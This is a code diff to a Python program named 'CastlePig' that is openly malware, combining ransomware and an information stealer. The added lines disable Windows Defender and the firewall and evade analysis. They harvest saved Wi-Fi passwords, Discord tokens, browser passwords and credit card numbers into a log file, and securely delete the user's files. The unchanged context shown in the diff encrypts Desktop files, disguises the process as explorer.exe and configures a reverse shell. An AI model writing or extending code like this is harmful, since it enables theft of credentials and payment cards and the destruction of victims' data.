@@ -1,3 +1,10 @@
+# CastlePig Encryption
+import castle_pig.anti_analysis
+
+castle_pig.anti_analysis.check_for_suspicious_processes()
+castle_pig.anti_analysis.disable_defender_and_firewall()
+
+
 import os
 import threading
 import castle_pig.file_encrypter
@@ -18,6 +25,52 @@ castle_pig.process_blender.set_process_title_windows("explorer.exe")
 # Uncomment below to run in a hidden window
 # castle_pig.process_blender.run_hidden_windows()
 
+# Secure delete
+import castle_pig.secure_delete
+
+#
+#
+#
+# CastlePig Data Exfiltration
+
+# Wifi
+from data_grabber.wifi_grabber import grab_wifi_passwords
+
+wifi_data = grab_wifi_passwords()
+with open("log.txt", "a") as log:
+    log.write("Wi-Fi Name                    | Password\n")
+    log.write("------------------------------------------\n")
+    for ssid, password in wifi_data:
+        log.write(f"{ssid:<30}| {password}\n")
+
+# Discord
+from data_grabber.discord_token_grabber import find_discord_tokens
+
+tokens = find_discord_tokens()
+with open("log.txt", "a") as log:
+    log.write("Discord Tokens:\n")
+    for token in tokens:
+        log.write(token + "\n")
+
+# Browser Passwords, cards, bookmarks
+from data_grabber.browser_data_grabber import (
+    extract_browser_passwords,
+    extract_browser_cards,
+    extract_browser_bookmarks
+)
+
+with open("log.txt", "a", encoding="utf-8") as log:
+    log.write("Browser Passwords:\n")
+    for entry in extract_browser_passwords():
+        log.write(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}\n")
+
+    log.write("\nBrowser Credit Cards:\n")
+    for entry in extract_browser_cards():
+        log.write(f"[{entry['browser']}] {entry['name']} | {entry['card_number']} | {entry['exp_month']}/{entry['exp_year']}\n")
+
+    log.write("\nBrowser Bookmarks:\n")
+    for entry in extract_browser_bookmarks():
+        log.write(f"[{entry['browser']}] {entry['name']} | {entry['url']}\n")
 
 # .env loadenv file is populated
 # Uncomment below to use and clean up any unneeded code
@@ -72,6 +125,7 @@ ENCRYPTED_FOLDER = "EncryptedFiles"
 ENABLE_REVERSE_SHELL = False  # Set to True to enable reverse shell
 REVERSE_SHELL_IP = "127.0.0.1"
 REVERSE_SHELL_PORT = 4444
+DELTE_FILE = False
 
 # Get all files from the user's Desktop (recursively)
 files = castle_pig.desktop_files.get_all_files_from_desktop() # Assuming this is in desktop_files
@@ -112,6 +166,11 @@ def main():
             delete_original=True,
             move_to_folder=ENCRYPTED_FOLDER
         )
+        if DELTE_FILE:
+            castle_pig.secure_delete.secure_delete(_file)
+            print(f"Deleted: {_file}")
+        else:
+            print(f"Not deleting: {_file}")
         if encrypted_path:
             print(f"Encrypted file at: {encrypted_path}")
         else:
